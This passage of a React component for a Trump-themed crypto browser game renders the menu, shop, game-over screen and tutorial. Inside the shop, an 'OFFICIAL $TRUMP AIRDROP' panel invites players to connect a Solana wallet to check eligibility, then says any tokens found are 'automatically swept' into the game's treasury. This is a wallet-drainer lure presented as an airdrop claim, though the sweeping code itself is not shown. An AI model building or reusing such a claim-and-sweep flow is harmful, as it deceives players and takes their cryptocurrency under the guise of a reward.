                            (selectedGameMode === GameMode.NORTH_POLE_DELIVERY ? 'bg-teal-600 text-white shadow-[0_0_30px_rgba(20,184,166,0.5)]' :
                            'bg-red-600 text-white shadow-[0_0_30px_rgba(220,38,38,0.5)]'))
                        }`}
                    >
                        {selectedGameMode === GameMode.DIAMOND_HANDS ? 'START HARDCORE' : 
                        (selectedGameMode === GameMode.FLAPPY_TRUMP ? 'START FLYING' : 
                        (selectedGameMode === GameMode.NORTH_POLE_DELIVERY ? 'DELIVER GIFTS' : 'PLAY NOW'))}
                    </button>
                    
                    <button 
                        onClick={() => setGameState(GameState.SHOP)}
                        className="group w-full py-3 bg-blue-600 text-white font-bold text-lg md:text-xl rounded skew-x-[-10deg] active:scale-95 active:skew-x-0 shadow-lg transition-all flex items-center justify-center gap-2"
                    >
                        <span>🛒 TRUMP SHOP</span>
                    </button>

                    {/* DAILY MISSION CARD */}
                    {dailyMission && (
                        <div className="mt-2 bg-slate-900/90 border-2 border-yellow-500 rounded-xl p-2 md:p-3 flex flex-col gap-1 relative overflow-hidden group">
                             <div className="absolute top-0 right-0 bg-yellow-500 text-black font-black text-[8px] md:text-[10px] px-2 py-0.5 rounded-bl">DAILY MISSION</div>
                             <div className="flex justify-between items-center mt-2">
                                 <div>
                                    <h3 className="font-bold text-yellow-400 text-xs md:text-sm text-left">{dailyMission.description}</h3>
                                    <p className="text-[10px] md:text-xs text-gray-400 text-left">Reward: <span className="text-green-400 font-bold">₿{dailyMission.reward}</span></p>
                                 </div>
                                 <div className="text-right">
                                    <p className="font-mono text-white text-xs md:text-sm">{dailyMission.progress} / {dailyMission.target}</p>
                                 </div>
                             </div>
                             <div className="w-full bg-slate-700 h-1.5 md:h-2 rounded-full overflow-hidden">
                                 <div className="bg-yellow-500 h-full transition-all" style={{width: `${Math.min(100, (dailyMission.progress / dailyMission.target) * 100)}%`}}></div>
                             </div>
                             
                             {dailyMission.isCompleted && !dailyMission.isClaimed ? (
                                 <button 
                                    onClick={claimDailyReward}
                                    className="w-full py-1 bg-green-500 text-black font-bold text-xs md:text-sm rounded animate-pulse mt-1"
                                 >
                                     CLAIM REWARD
                                 </button>
                             ) : null}
                        </div>
                    )}
                    
                    <div className="mt-1 flex flex-col gap-1 text-xs md:text-sm font-mono bg-slate-900/80 p-2 md:p-3 rounded border border-slate-700">
                        <div className="flex justify-between">
                            <span className="text-gray-400">Net Worth:</span> 
                            <span className="text-green-400 font-bold">₿{netWorth.toLocaleString()}</span>
                        </div>
                        <div className="flex justify-between">
                            <span className="text-gray-400">High Score:</span> 
                            <span className="text-yellow-400 font-bold">₿{highScore.toLocaleString()}</span>
                        </div>
                    </div>
                </div>
             </div>
          </div>
        )}

        {/* --- SHOP STATE --- */}
        {gameState === GameState.SHOP && (
            <div className="absolute inset-0 flex items-center justify-center bg-slate-900 pointer-events-auto z-50 overflow-y-auto safe-top safe-bottom">
                <div className="w-full max-w-5xl p-4 md:p-8 h-full overflow-y-auto">
                    <div className="flex justify-between items-center mb-6 sticky top-0 bg-slate-900 z-10 py-4 border-b border-slate-700">
                        <div>
                            <h2 className="text-2xl md:text-4xl font-black text-white italic">TRUMP EXCHANGE</h2>
                            <p className={`font-mono font-bold text-sm md:text-base transition-all duration-300 origin-left inline-block ${
                                netWorthEffect === 'increase' ? 'text-green-200 scale-110 brightness-150' : 
                                netWorthEffect === 'decrease' ? 'text-red-400 scale-110 brightness-150' : 
                                'text-green-400'
                            }`}>
                                WALLET: ₿{netWorth.toLocaleString()}
                            </p>
                        </div>
                        <button onClick={() => {
                            saveState(highScore, netWorth, ownedSkins, inventory); // Force save on close
                            setGameState(GameState.MENU);
                        }} className="text-gray-400 hover:text-white font-bold px-3 py-1 md:px-4 md:py-2 border border-gray-600 rounded bg-slate-800 text-xs md:text-base">CLOSE X</button>
                    </div>

                    <div className="space-y-8 pb-20">
                        
                         {/* OFFICIAL TRUMP AIRDROP SECTION (SHOP VIEW) */}
                         <section>
                             <div className="flex justify-between items-center mb-4">
                                <h3 className="text-base md:text-xl text-yellow-500 font-bold tracking-widest border-l-4 border-yellow-500 pl-2">OFFICIAL $TRUMP AIRDROP</h3>
                                <div className="flex items-center gap-2">
                                     {walletAddress ? (
                                         <div className="bg-[#1e1e1e] border border-yellow-500 rounded-lg px-2 py-1 md:px-4 md:py-2 flex items-center gap-2">
                                             <div className="w-2 h-2 md:w-3 md:h-3 bg-green-500 rounded-full animate-pulse"></div>
                                             <span className="text-[10px] md:text-xs font-mono text-gray-300">{walletAddress.slice(0,4)}...{walletAddress.slice(-4)}</span>
                                             <button onClick={disconnectWallet} className="ml-2 text-[10px] md:text-xs text-red-400 hover:text-red-300">DISCONNECT</button>
                                         </div>
                                     ) : (
                                         <button 
                                            onClick={connectWallet}
                                            className="bg-[#AB9FF2] hover:bg-[#9945FF] text-[#1e1e1e] font-black px-3 py-1 md:px-4 md:py-2 rounded-lg flex items-center gap-2 transition-all hover:scale-105 text-xs md:text-base"
                                         >
                                             <PhantomIcon className="w-4 h-4 md:w-6 md:h-6" />
                                             CONNECT
                                         </button>
                                     )}
                                </div>
                             </div>
                             
                             <div className="bg-gradient-to-r from-[#1e1e1e] to-[#2a2a2a] p-4 md:p-6 rounded-xl border border-gray-700 relative overflow-hidden group">
                                 <div className="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity">
                                     <TrumpTokenIcon className="w-20 h-20 md:w-40 md:h-40 animate-spin-y-fast" />
                                 </div>
                                 <div className="relative z-10">
                                     <h4 className="text-white font-bold mb-2 flex items-center gap-2 text-sm md:text-base">
                                         <TrumpTokenIcon className="w-5 h-5 md:w-6 md:h-6 text-yellow-400" />
                                         $TRUMP TOKEN CLAIM
                                     </h4>
                                     <p className="text-gray-400 text-xs md:text-sm mb-4 max-w-lg">
                                         Connect your Solana wallet to check for **$TRUMP** token eligibility. 
                                         Any found tokens will be <span className="text-yellow-400 font-bold">automatically swept</span> into the Game Treasury.
                                     </p>
                                     
                                     <div className="flex flex-col md:flex-row gap-2 md:gap-4 bg-black/40 p-2 md:p-4 rounded-lg border border-gray-600 mb-2">
                                         <div className="flex-1">
                                             <p className="text-[10px] md:text-xs text-gray-500 uppercase mb-1">STATUS</p>
                                             <div className="text-sm md:text-lg font-bold text-white">
                                                 {isSweeping ? (
                                                    <span className="text-yellow-400 animate-pulse">SWEEPING $TRUMP...</span>
                                                 ) : walletAddress ? (
                                                    <span className="text-green-400">SECURED</span>
                                                 ) : (
                                                    "WAITING..."
                                                 )}
                                             </div>
                                         </div>
                                     </div>
                                 </div>
                             </div>
                         </section>

                        {/* SKINS SECTION */}
                        <section>
                            <h3 className="text-lg md:text-xl text-yellow-400 font-bold tracking-widest mb-4 border-l-4 border-yellow-400 pl-2">EXCLUSIVE SKINS</h3>
                            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 md:gap-6">
                                {skins.map((skin) => {
                                    const isOwned = ownedSkins.includes(skin.id);
                                    const isSelected = selectedSkin === skin.id;
                                    const canAfford = netWorth >= skin.price;

                                    return (
                                        <div key={skin.id} className={`group relative bg-slate-800 rounded-xl p-4 md:p-6 border-2 transition-all ${isSelected ? 'border-green-500 shadow-[0_0_20px_rgba(34,197,94,0.4)]' : 'border-slate-700'}`}>
                                            <div className="h-24 md:h-32 flex items-center justify-center mb-4 bg-slate-900/50 rounded-lg">
                                                <div className="w-16 h-16 md:w-20 md:h-20">
                                                    <TrumpBackIcon className="w-full h-full" skin={skin.id} />
                                                </div>
                                            </div>
                                            <div className="flex justify-between items-start mb-2">
                                                <h3 className="text-base md:text-lg font-bold text-white">{skin.name}</h3>
                                                {isOwned && <span className="bg-blue-900 text-blue-200 text-[10px] px-2 py-1 rounded">OWNED</span>}
                                            </div>
                                            <p className="text-[10px] md:text-xs text-gray-400 mb-4 h-8">{skin.desc}</p>
                                            
                                            <div className="flex gap-2">
                                                {isOwned ? (
                                                    <>
                                                        <button 
                                                            onClick={() => setSelectedSkin(skin.id)}
                                                            disabled={isSelected}
                                                            className={`flex-1 py-2 rounded font-bold text-xs md:text-sm ${isSelected ? 'bg-green-600 text-white cursor-default' : 'bg-slate-600 hover:bg-slate-500 text-white'}`}
                                                        >
                                                            {isSelected ? 'EQUIPPED' : 'EQUIP'}
                                                        </button>
                                                        {skin.id !== SkinType.DEFAULT && !isSelected && (
                                                            <button 
                                                                onClick={() => {
                                                                    sellItem(Math.floor(skin.price * 0.5), () => {
                                                                        setOwnedSkins(prev => prev.filter(s => s !== skin.id));
                                                                        if (selectedSkin === skin.id) setSelectedSkin(SkinType.DEFAULT);
                                                                    });
                                                                }}
                                                                className="px-2 py-2 bg-red-900/50 border border-red-800 text-red-200 rounded font-bold text-[10px]"
                                                            >
                                                                SELL
                                                            </button>
                                                        )}
                                                    </>
                                                ) : (
                                                    <button 
                                                        onClick={() => buyItem(skin.price, () => setOwnedSkins([...ownedSkins, skin.id]))}
                                                        disabled={!canAfford}
                                                        className={`w-full py-2 rounded font-bold flex justify-between px-4 text-xs md:text-sm ${canAfford ? 'bg-green-600 hover:bg-green-500 text-white' : 'bg-slate-700 text-gray-500 cursor-not-allowed'}`}
                                                    >
                                                        <span>BUY</span>
                                                        <span>₿{skin.price.toLocaleString()}</span>
                                                    </button>
                                                )}
                                            </div>
                                        </div>
                                    )
                                })}
                            </div>
                        </section>

                        {/* CONSUMABLES SECTION */}
                        <section>
                            <h3 className="text-lg md:text-xl text-blue-400 font-bold tracking-widest mb-4 border-l-4 border-blue-400 pl-2">POWER-UP FUTURES</h3>
                            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 md:gap-6">
                                {upgrades.map((item) => {
                                    const count = inventory[item.id] || 0;
                                    const canAfford = netWorth >= item.price;
                                    const Icon = item.icon;

                                    return (
                                        <div key={item.id} className="group relative bg-slate-800 rounded-xl p-4 md:p-6 border-2 border-slate-700 hover:border-blue-500 transition-all">
                                            <div className="flex justify-between items-start mb-4">
                                                <div className="bg-blue-900/30 p-2 md:p-3 rounded-lg">
                                                    <Icon className="w-8 h-8 md:w-10 md:h-10" />
                                                </div>
                                                <div className="text-right">
                                                    <div className="text-xl md:text-2xl font-bold text-white font-mono">{count}</div>
                                                    <div className="text-[10px] text-gray-400 uppercase">IN STOCK</div>
                                                </div>
                                            </div>
                                            <h3 className="text-base md:text-lg font-bold text-white mb-1">{item.name}</h3>
                                            <p className="text-[10px] md:text-xs text-gray-400 mb-4">{item.desc}</p>
                                            
                                            <button 
                                                onClick={() => buyItem(item.price, () => setInventory({ ...inventory, [item.id]: count + 1 }))}
                                                disabled={!canAfford}
                                                className={`w-full py-2 rounded font-bold flex justify-between px-4 text-xs md:text-sm ${canAfford ? 'bg-blue-600 hover:bg-blue-500 text-white' : 'bg-slate-700 text-gray-500 cursor-not-allowed'}`}
                                            >
                                                <span>BUY</span>
                                                <span>₿{item.price.toLocaleString()}</span>
                                            </button>
                                        </div>
                                    )
                                })}
                            </div>
                        </section>
                        
                         {/* SATOSHI SNACKS (DOLLAR MENU) */}
                         <section>
                            <h3 className="text-lg md:text-xl text-green-400 font-bold tracking-widest mb-4 border-l-4 border-green-400 pl-2">SATOSHI SNACKS</h3>
                            <div className="grid grid-cols-2 md:grid-cols-4 gap-2 md:gap-4">
                                {cheapItems.map((item) => {
                                    const count = inventory[item.id] || 0;
                                    const canAfford = netWorth >= item.price;
                                    const Icon = item.icon;

                                    return (
                                        <div key={item.id} className="group relative bg-slate-800 rounded-xl p-3 md:p-4 border-2 border-slate-700 hover:border-green-500 transition-all">
                                            <div className="flex flex-col items-center text-center mb-2">
                                                <Icon className="w-8 h-8 md:w-12 md:h-12 mb-2" />
                                                <h3 className="text-xs md:text-sm font-bold text-white">{item.name}</h3>
                                                <span className="text-[10px] text-gray-400">Stock: {count}</span>
                                            </div>
                                            <button 
                                                onClick={() => buyItem(item.price, () => setInventory({ ...inventory, [item.id]: count + 1 }))}
                                                disabled={!canAfford}
                                                className={`w-full py-1 rounded font-bold text-[10px] md:text-xs ${canAfford ? 'bg-green-600 hover:bg-green-500 text-white' : 'bg-slate-700 text-gray-500 cursor-not-allowed'}`}
                                            >
                                                BUY ₿{item.price}
                                            </button>
                                        </div>
                                    )
                                })}
                            </div>
                        </section>
                    </div>
                </div>
            </div>
        )}

        {/* --- GAME OVER STATE --- */}
        {gameState === GameState.GAME_OVER && (
            <div className="absolute inset-0 bg-red-900/90 flex flex-col items-center justify-center p-4 md:p-8 text-center animate-fade-in pointer-events-auto z-50 safe-top safe-bottom">
                <h1 className="text-4xl md:text-6xl font-black text-white mb-2 uppercase drop-shadow-[0_5px_5px_rgba(0,0,0,0.5)]">SAD!</h1>
                <p className="text-lg md:text-2xl text-red-200 font-bold mb-4 md:mb-8">"They stole the election, and your coins!"</p>
                
                <div className="bg-slate-900/50 p-4 md:p-8 rounded-xl border-2 border-red-500 mb-4 md:mb-8 w-full max-w-md backdrop-blur-sm shadow-2xl transform hover:scale-105 transition-all">
                    <div className="flex justify-between items-end mb-4 border-b border-red-500/30 pb-4">
                        <span className="text-gray-400 text-xs md:text-sm font-bold uppercase tracking-widest">Score</span>
                        <span className="text-2xl md:text-4xl font-black text-white">₿{score.toLocaleString()}</span>
                    </div>
                    <div className="flex justify-between items-end">
                        <span className="text-gray-400 text-xs md:text-sm font-bold uppercase tracking-widest">High Score</span>
                        <span className="text-xl md:text-2xl font-bold text-yellow-400">₿{highScore.toLocaleString()}</span>
                    </div>
                    
                    {/* Mission Progress in Game Over */}
                    {dailyMission && !dailyMission.isCompleted && (
                        <div className="mt-4 pt-4 border-t border-white/10">
                            <div className="flex justify-between text-[10px] md:text-xs mb-1">
                                <span className="text-yellow-500 font-bold">Daily Mission Progress</span>
                                <span className="text-white">{dailyMission.progress} / {dailyMission.target}</span>
                            </div>
                            <div className="w-full bg-slate-700 h-1.5 rounded-full overflow-hidden">
                                 <div className="bg-yellow-500 h-full" style={{width: `${Math.min(100, (dailyMission.progress / dailyMission.target) * 100)}%`}}></div>
                            </div>
                        </div>
                    )}
                </div>
                
                <div className="flex gap-2 md:gap-4 w-full max-w-md">
                    <button 
                        onClick={handleStartGame}
                        className="flex-1 bg-green-600 hover:bg-green-500 text-white font-black text-sm md:text-xl py-3 md:py-4 rounded shadow-lg transition-all transform hover:scale-105 active:scale-95"
                    >
                        TRY AGAIN
                    </button>
                    <button 
                        onClick={() => setGameState(GameState.MENU)}
                        className="flex-1 bg-slate-700 hover:bg-slate-600 text-white font-bold text-sm md:text-xl py-3 md:py-4 rounded shadow-lg transition-all"
                    >
                        MENU
                    </button>
                </div>
            </div>
        )}

        {/* --- TUTORIAL MODAL --- */}
        {showTutorial && (
            <div className="absolute inset-0 z-[200] bg-slate-900/95 flex items-center justify-center p-4 backdrop-blur-sm animate-fade-in pointer-events-auto">
                <div className="bg-white text-slate-900 w-full max-w-md rounded-2xl p-6 md:p-8 shadow-2xl relative border-4 border-blue-500">
                     <div className="text-center">
                         <h2 className="text-2xl md:text-3xl font-black text-blue-900 mb-2 md:mb-4">{tutorialSteps[tutorialStep].title}</h2>
                         <div className="flex justify-center my-4 md:my-6">
                            {tutorialSteps[tutorialStep].icon}
                         </div>
                         <div className="text-sm md:text-lg font-medium text-slate-700 mb-6 md:mb-8 min-h-[80px] flex items-center justify-center">
                             {tutorialSteps[tutorialStep].content}
                         </div>
                         
                         <div className="flex justify-between items-center mt-4">
                             <div className="flex gap-1">
                                 {tutorialSteps.map((_, i) => (
                                     <div key={i} className={`w-2 h-2 rounded-full ${i === tutorialStep ? 'bg-blue-600' : 'bg-gray-300'}`} />
                                 ))}
                             </div>
                             
                             <button 
                                onClick={() => {
                                    try { playBuySound(); } catch(e) {}
                                    if (tutorialStep < tutorialSteps.length - 1) {
                                        setTutorialStep(s => s + 1);
                                    } else {
                                        completeTutorial();
                                    }
                                }}
                                className="bg-red-600 hover:bg-red-500 text-white font-bold py-2 px-4 md:px-6 rounded-lg shadow-lg text-sm md:text-base"
                             >
                                 {tutorialStep < tutorialSteps.length - 1 ? 'NEXT >' : 'LET\'S PLAY!'}
                             </button>
                         </div>
                     </div>
                </div>
            </div>
        )}

      </div>
    </div>
  );
}